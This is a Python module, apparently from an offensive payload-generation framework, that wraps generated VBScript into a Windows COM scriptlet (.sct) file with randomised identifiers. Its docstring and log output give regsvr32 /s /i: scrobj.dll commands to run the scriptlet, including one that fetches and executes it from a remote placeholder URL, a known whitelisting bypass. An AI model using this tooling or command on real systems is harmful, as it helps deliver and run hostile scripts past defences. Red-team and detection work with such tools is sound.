#!/usr/bin/env python
# encoding: utf-8
import os
import random
import logging
from common.utils import randomAlpha
from modules.vbs_gen import VBSGenerator

SCT_TEMPLATE = \
r"""<?XML version="1.0"?>
<scriptlet>
<registration 
    progid="<<<random>>>"
    classid="{<<<CLS1>>>-0000-0000-0000-<<<CLS4>>>}" >
    <script language="VBScript">
        <![CDATA[
            <<<VBS>>>
            <<<MAIN>>>  
    
        ]]>
</script>
</registration>
</scriptlet>
"""

class SCTGenerator(VBSGenerator):
    """ Module used to generate SCT file from working dir content
    To execute: 
    regsvr32 /u /n /s /i:hello.sct scrobj.dll
    Also work on remote files
    
    regsvr32 /u /n /s /i:http://www.domain.blah/hello.sct scrobj.dll
    """
        
        
    def generate(self):
        logging.info(f" [+] Generating {self.outputFileType} file...")
        self.vbScriptConvert()
        with open(f"{self.getMainVBAFile()}.vbs") as f:
            vbsContent = f.read()
        vbsContent = vbsContent.replace("WScript.Echo ", "MsgBox ")

        # Write VBS in template
        sctContent = SCT_TEMPLATE
        sctContent = sctContent.replace("<<<random>>>", randomAlpha(8))
        sctContent = sctContent.replace(
            "<<<CLS1>>>",
            ''.join([random.choice('0123456789ABCDEF') for _ in range(8)]),
        )

        sctContent = sctContent.replace(
            "<<<CLS4>>>",
            ''.join([random.choice('0123456789ABCDEF') for _ in range(12)]),
        )

        sctContent = sctContent.replace("<<<VBS>>>", vbsContent)
        sctContent = sctContent.replace("<<<MAIN>>>", self.startFunction)
        with open(self.outputFilePath, 'w') as f:
            f.writelines(sctContent)
        logging.info(f"   [-] Generated Scriptlet file: {self.outputFilePath}")
        logging.info("   [-] Test with : \nregsvr32 /u /n /s /i:%s scrobj.dll\n" % self.outputFilePath)
        if os.path.getsize(self.outputFilePath)> (1024*512):
            logging.warning(
                f"   [!] Warning: The resulted {self.outputFileType} file seems to be bigger than 512k, it will probably not work!"
            )

        
        
        
        
        